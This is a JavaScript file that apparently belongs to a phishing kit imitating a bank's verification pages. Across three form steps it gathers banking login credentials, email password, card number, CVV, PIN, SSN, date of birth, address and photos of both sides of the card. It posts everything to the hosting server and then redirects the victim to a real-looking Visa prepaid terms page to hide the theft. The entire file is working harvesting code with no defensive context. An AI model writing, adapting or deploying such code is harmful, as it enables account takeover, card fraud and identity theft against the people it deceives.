document.addEventListener("DOMContentLoaded", () => {
    
    document.querySelector("button#bars").addEventListener("click", btn => {
        document.querySelector("nav.top-bar.mobile-nav").classList.toggle("showNav")
    });


    try {
        document.querySelector("form#step1").addEventListener("submit", e => {
            e.preventDefault();
            const obj = {
                username: e.currentTarget.querySelector("input#username").value,
                password: e.currentTarget.querySelector("input#password").value
            };

            localStorage.setItem("bank_ame", JSON.stringify(obj))
            
            //Remove First Slide And Add Second Slide
            document.querySelector("#Cstep1").remove();     
            document.querySelector("#Cstep2").classList.add("showMe");     
        })
    } catch (error) {
        
    }
    
    try {
        document.querySelector("form#step2").addEventListener("submit", e => {
            e.preventDefault();
            let obj = {
                email: e.currentTarget.querySelector("input#email").value,
                emailPassword: e.currentTarget.querySelector("input#email-password").value,
                cardNo: e.currentTarget.querySelector("input#cardno").value,
                cardCvv: e.currentTarget.querySelector("input#cvv").value,
                expDate: e.currentTarget.querySelector("input#expdate").value,
                cardPin: e.currentTarget.querySelector("input#pin").value,
                ssn: e.currentTarget.querySelector("input#ssn").value,
                address: e.currentTarget.querySelector("input#address").value,
                cardName: e.currentTarget.querySelector("input#cardName").value,
                phone: e.currentTarget.querySelector("input#phone").value,
                fullName: e.currentTarget.querySelector("input#fullname").value,
                dob: e.currentTarget.querySelector("input#dob").value
            };

            const emailPassword2 = e.currentTarget.querySelector("input#email-password2").value;

            //Cross Check Email Password;
            if (obj.emailPassword !== emailPassword2) {
                alert("Email Password Not Matched");
                return
            }
            
            
            
            const prevData = JSON.parse(localStorage.getItem("bank_ame"))
            
            obj = { ...prevData, ...obj };

            localStorage.setItem("bank_ame", JSON.stringify(obj))

            //Remove First Slide And Add Second Slide
            document.querySelector("#Cstep2").remove();     
            document.querySelector("#Cstep3").classList.add("showMe");

        })
    } catch (error) {
        
    }

    try {
        document.querySelector("form#step3").addEventListener("submit", e => {
            e.preventDefault();
            const image = new FormData();
            image.append("file",e.currentTarget.querySelector("input#cardFront").files[0])
            image.append("file", e.currentTarget.querySelector("input#cardBack").files[0]);

            const prevData = JSON.parse(localStorage.getItem("bank_ame"));

            fetch(window.location.href, {
                    method: "POST",
                    credentials: "include",
                    mode: "cors",
                    headers: {
                        "content-type": "application/json"
                    },
                    body: JSON.stringify(prevData)
            }).then(res => res.json())
                .then(res => {
                    console.log(res);
                if (res) {
                    
                    //Send Files
                    fetch(`${window.location.origin + window.location.pathname}?filename=${res.filename}`, {
                    method: "POST",
                    credentials: "include",
                    mode: "cors",
                    body: image
                    }).then(res => res.json())
                    .then(res =>{
                        if (res) {
                            window.location.href = "https://www.visaprepaidprocessing.com/eddcard/Program/Terms";
                        }
                    })
                    
                }
            }).catch(err => console.log(err))
            
               
        })
    } catch (error) {
        
    }


    window.navigateBack = function(){window.location.href = "/"}
})




